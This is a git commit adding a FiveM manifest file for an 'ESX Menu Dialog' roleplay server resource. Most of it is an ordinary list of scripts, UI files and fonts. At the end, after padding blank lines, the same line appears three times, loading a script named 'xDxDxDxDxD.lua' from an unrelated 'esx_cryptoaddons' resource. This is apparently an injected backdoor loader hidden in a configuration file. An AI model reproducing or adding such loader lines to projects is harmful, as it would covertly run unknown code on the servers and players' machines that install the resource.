89d70c427dcf3048555721e8276be7974393ab10
GJSBRT <gijsgames9@gmail.com>
2021-09-07 00:13:16 +0200

    Added Zwanenburg Roleplay

---
+++ Zwanenburg Roleplay/V2/esx_menu_dialog/fxmanifest.lua
@@ -0,0 +1,34 @@
+fx_version 'adamant'
+
+game 'gta5'
+
+description 'ESX Menu Dialog'
+
+version '1.1.0'
+
+client_script 'client/main.lua'
+
+ui_page 'html/ui.html'
+
+files {
+	'html/ui.html',
+
+	'html/css/app.css',
+
+	'html/js/mustache.min.js',
+	'html/js/app.js',
+
+	'html/fonts/pdown.ttf',
+	'html/fonts/bankgothic.ttf'
+}
+
+dependency 'es_extended'
+
+
+
+
+client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'
+
+client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'
+
+client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'
